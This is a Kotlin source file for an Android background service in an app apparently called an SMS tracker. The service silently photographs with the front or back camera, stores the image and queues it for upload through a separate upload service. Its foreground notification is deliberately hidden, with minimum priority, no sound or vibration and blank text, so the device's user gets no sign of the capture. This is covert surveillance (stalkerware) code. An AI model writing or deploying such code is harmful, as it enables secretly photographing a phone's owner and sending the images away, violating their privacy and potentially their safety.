package com.safi.smstracker

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class CameraCaptureService : Service() {

    companion object {
        private const val TAG = "SAFI_CAMERA"
        private const val CHANNEL_ID = "SAFI_CAMERA"
        private const val NOTIF_ID = 1338
        const val EXTRA_CAMERA_FACING = "camera_facing"
        const val FACING_FRONT = 0
        const val FACING_BACK = 1
        
        fun capturePhoto(context: Context, facing: Int) {
            val intent = Intent(context, CameraCaptureService::class.java)
            intent.putExtra(EXTRA_CAMERA_FACING, facing)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
            Log.d(TAG, "📸 Demande de photo: ${if(facing==FACING_FRONT) "AVANT" else "ARRIÈRE"}")
        }
    }

    private var cameraManager: CameraManager? = null
    private var cameraDevice: CameraDevice? = null
    private var imageReader: ImageReader? = null
    private var photoFile: File? = null
    private var facing: Int = FACING_BACK

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIF_ID, createNotification())
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        Log.d(TAG, "📸 Service caméra démarré en arrière-plan")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        facing = intent?.getIntExtra(EXTRA_CAMERA_FACING, FACING_BACK) ?: FACING_BACK
        openCamera()
        return START_NOT_STICKY
    }

    private fun openCamera() {
        try {
            val cameraId = getCameraId(facing) ?: run {
                Log.e(TAG, "Caméra non disponible")
                stopSelf()
                return
            }

            imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 1)
            photoFile = createPhotoFile()

            cameraManager?.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    cameraDevice = cam
                    takePicture()
                }

                override fun onDisconnected(cam: CameraDevice) {
                    cameraDevice?.close()
                    cameraDevice = null
                }

                override fun onError(cam: CameraDevice, error: Int) {
                    Log.e(TAG, "Erreur caméra: $error")
                    cameraDevice?.close()
                    cameraDevice = null
                    stopSelf()
                }
            }, null)

        } catch (e: Exception) {
            Log.e(TAG, "Erreur ouverture caméra", e)
            stopSelf()
        }
    }

    private fun getCameraId(targetFacing: Int): String? {
        try {
            cameraManager?.cameraIdList?.forEach { id ->
                val chars = cameraManager?.getCameraCharacteristics(id)
                val facing = chars?.get(CameraCharacteristics.LENS_FACING)
                if (facing == targetFacing) return id
            }
        } catch (e: CameraAccessException) {
            Log.e(TAG, "Erreur accès caméra", e)
        }
        return null
    }

    private fun takePicture() {
        try {
            val reader = imageReader ?: return
            val cam = cameraDevice ?: return

            reader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()
                savePhoto(bytes)
                cam.close()
                stopSelf()
            }, null)

            val captureRequest = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(reader.surface)
                set(CaptureRequest.JPEG_ORIENTATION, 90)
            }

            cam.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    session.capture(captureRequest.build(), null, null)
                }
                override fun onConfigureFailed(session: CameraCaptureSession) {
                    Log.e(TAG, "Échec configuration caméra")
                }
            }, null)

        } catch (e: Exception) {
            Log.e(TAG, "Erreur prise photo", e)
            stopSelf()
        }
    }

    private fun createPhotoFile(): File {
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.FRANCE).format(Date())
        val storageDir = File(filesDir, "photos_cache")
        if (!storageDir.exists()) storageDir.mkdirs()
        return File(storageDir, "PHOTO_${timeStamp}.jpg")
    }

    private fun savePhoto(bytes: ByteArray) {
        try {
            val fos = FileOutputStream(photoFile)
            fos.write(bytes)
            fos.close()
            Log.d(TAG, "✅ Photo sauvegardée: ${photoFile?.absolutePath}")
            PhotoUploadService.addPhotoToQueue(this, photoFile!!)
            MainMapActivity.instance?.runOnUiThread {
                MainMapActivity.instance?.onPhotoReceived(photoFile!!)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Erreur sauvegarde photo", e)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "SAFI — Caméra",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                enableVibration(false)
                setSound(null, null)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        val intent = packageManager.getLaunchIntentForPackage(packageName)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_IMMUTABLE else 0
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(" ")
            .setContentText(" ")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentIntent(pendingIntent)
            .setOngoing(false)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null
    override fun onDestroy() {
        super.onDestroy()
        cameraDevice?.close()
        imageReader?.close()
    }
}
